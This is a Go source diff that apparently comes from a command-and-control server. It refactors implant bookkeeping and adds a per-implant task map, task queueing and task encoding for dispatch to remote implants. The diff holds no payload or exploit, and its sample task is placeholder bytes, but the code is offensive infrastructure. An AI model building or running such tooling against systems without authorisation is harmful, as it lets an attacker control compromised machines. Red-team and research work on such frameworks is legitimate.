@@ -33,6 +33,7 @@ func ImplantNew(name, key string) *Implant {
 		Alive:     true,
 		LastSeen:  n,
 		FirstSeen: n,
+		TaskMap: make(map[[8]byte]*Task),
 	}
 }
 
@@ -106,19 +107,39 @@ func (i *Implant) ImplantSetRemoteSocket(socket string) {
 	i.Metadata.Socket = socket
 }
 
-func ImplantVerifyName(name string) bool {
-	if ImplantMAP[name] == nil {
-		return false
-	} else {
-		return true
-	}
+func ImplantPtrByName(name string) *Implant {
+	return ImplantMAP[name]
 }
 
-
-func ImplantUpdateLastseen(name string) {
-	ImplantMAP[name].LastSeen = time.Now()
+func (i *Implant) ImplantUpdateLastseen() {
+	i.LastSeen = time.Now()
 }
 
 func ImplantCount() int {
 	return len(ImplantMAP)
+}
+
+func ImplantAddTask() {
+	if CurrentImplant == "none" {
+		return
+	}
+	t := TaskNew(0x01, []byte("aaa bbbb"))
+	ImplantMAP[CurrentImplant].ImplantAddTask(t)
+}
+
+func (i *Implant) ImplantAddTask(task *Task) {
+	i.Task = append(i.Task, task)
+	i.TaskMap[task.ID] = task
+	log.PrintInfo("new task added: ", string(task.ID[:]))
+}
+
+func (i *Implant) ImplantGetTaskStr() (string, [8]byte, error) {
+	t,err := i.TaskGet()
+	if err != nil {
+		return "", [8]byte{}, err
+	}
+
+	t.Sent = true
+	tb := t.TaskMarshal()
+	return TaskEncode(tb), t.ID, nil
 }
